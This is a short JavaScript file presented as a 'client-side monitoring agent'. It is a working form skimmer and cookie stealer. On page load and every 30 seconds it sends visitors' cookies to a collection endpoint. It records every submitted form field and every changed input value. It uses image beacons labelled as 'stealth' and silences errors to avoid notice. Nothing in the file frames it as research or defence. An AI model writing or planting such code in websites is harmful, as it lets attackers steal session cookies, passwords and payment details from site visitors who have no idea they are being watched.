// Ultimate Client-Side Monitoring Agent
(function() {
    const config = {
        sessionId: document.currentScript.getAttribute('data-session-id'),
        stealthLevel: parseInt(document.currentScript.getAttribute('data-stealth')) || 7,
        endpoint: '/collect'
    };

    // Stealthy data collection
    function collect(type, data) {
        if (config.stealthLevel > 5) {
            // Use image beacon for maximum stealth
            new Image().src = config.endpoint + '?t=' + type + 
                '&d=' + encodeURIComponent(JSON.stringify(data)) + 
                '&sid=' + config.sessionId + '&_' + Date.now();
        } else {
            // Use fetch when stealth isn't critical
            fetch(config.endpoint, {
                method: 'POST',
                body: JSON.stringify({
                    type: type,
                    data: data,
                    session_id: config.sessionId
                }),
                keepalive: true
            }).catch(() => {});
        }
    }

    // Initialize monitoring
    function init() {
        // Initial data collection
        collect('init', {
            url: location.href,
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            referrer: document.referrer
        });

        // Form monitoring
        document.addEventListener('submit', function(e) {
            const formData = {};
            Array.from(e.target.elements).forEach(el => {
                if (el.name) formData[el.name] = el.value;
            });
            collect('form', {
                action: e.target.action,
                method: e.target.method,
                data: formData
            });
        }, true);

        // Input monitoring
        document.addEventListener('change', function(e) {
            if (e.target.name) {
                collect('input', {
                    name: e.target.name,
                    value: e.target.value,
                    type: e.target.type
                });
            }
        });

        // Heartbeat
        setInterval(() => {
            collect('heartbeat', {
                url: location.href,
                cookies: document.cookie
            });
        }, 30000);
    }

    // Start when DOM is ready
    if (document.readyState === 'complete') {
        init();
    } else {
        document.addEventListener('DOMContentLoaded', init);
    }
})();